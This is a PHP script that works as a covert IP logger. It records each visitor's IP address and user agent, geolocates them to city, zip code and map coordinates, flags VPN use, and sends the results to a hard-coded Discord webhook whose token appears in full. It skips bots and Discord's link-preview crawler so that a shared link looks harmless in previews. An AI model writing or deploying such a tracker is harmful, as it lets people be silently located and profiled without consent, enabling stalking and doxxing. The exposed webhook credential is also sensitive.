<?php



$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
$Browser = $_SERVER['HTTP_USER_AGENT'];


if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
}


date_default_timezone_set("Europe");
$Date = date('d/m/Y');
$Time = date('G:i:s');


$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
if ($VPNConn->connection_type === "Corporate") {
    $VPN = "Yes";
} else {
    $VPN = "No";
}


$Country = $Details->country;
$CountryCode = $Details->countryCode;
$Region = $Details->regionName;
$City = $Details->city;
$Zip = $Details->zip;
$Lat = $Details->lat;
$Lon = $Details->lon;
$WebhookName = $IP;

//$Flag = "https://www.countryflags.io/{$Details->countryCode}/flat/64.png";
$Details->countryCode = strtolower($Details->countryCode);
$FlagOLD = "https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/{$Details->countryCode}.png";
$Flag = "https://countryflagsapi.com/png/{$Details->countryCode}";


class Discord
{

  
    public function Visitor()
    {
        global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;


        $Webhook = "https://discord.com/api/webhooks/1325864827305857034/s88Mj9HnNnsKwHvXhJm70MdgnMFRrhkUg1klM-PT4w_HmNfSencFJqrdnzap2J97xKVC";

        $InfoArr = array(
            "username" => "$WebhookName",
            "avatar_url" => "$Flag",
            "embeds" => [array(

                "title" => "Visitor From $Country",
                "color" => "39423",

                "fields" => [array(
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ),
                    array(
                        "name" => "VPN?",
                        "value" => "$VPN",
                        "inline" => true
                    ),
                    array(
                        "name" => "Useragent",
                        "value" => "$Browser"
                    ),
                    array(
                        "name" => "Country/CountryCode",
                        "value" => "$Country/$CountryCode",
                        "inline" => true
                    ),
                    array(
                        "name" => "Region | City | Zip",
                        "value" => "[$Region | $City | $Zip](https://www.google.com/maps/search/?api=1&query=$Lat,$Lon 'Google Maps Location (+/- 750M Radius)')",
                        "inline" => true
                    )],

                "footer" => array(
                    "text" => "$Date $Time",

                  "icon_url" => "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                ),
            )],
        );

      

        $JSON = json_encode($InfoArr);

        $Curl = curl_init($Webhook);
        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
		
	
        return curl_exec($Curl);

    }
}

?>
